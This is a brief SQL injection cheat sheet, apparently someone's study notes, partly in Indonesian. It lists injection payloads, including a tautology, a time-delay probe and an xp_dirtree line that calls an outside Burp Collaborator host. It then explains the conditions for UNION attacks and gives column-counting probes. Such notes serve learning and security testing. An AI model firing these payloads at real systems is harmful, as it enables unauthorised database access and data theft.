# SQL Injection

## Payload
```
'
' OR 1=1--
ASCII(97)
'; waitfor delay ('0:00:20')--
exec master..xp_dirtree'//asdfdagffdshsdfgadfgadfgaf.burpcollaborator.net/a'
```

## UNION Attack
Syarat:
  - The individual queries must return the same number of columns.
  - The data types in each column must be compatible between the individual queries.

Untuk melancarkan UNION attack harus memenuhi 2 syarat diatas. Dari syarat2 diatas timbullah pertanyaan:
  - How many columns are being returned from the original query?
  ```
  'UNION SELECT NULL,NULL,n--, dimana n adalah jumlah kolom
  'ORDER BY 1/2/n--, dimana n adalah jumlah kolom
  ```
  - Which columns returned from the original query are of a suitable data type to hold the results from the injected query?


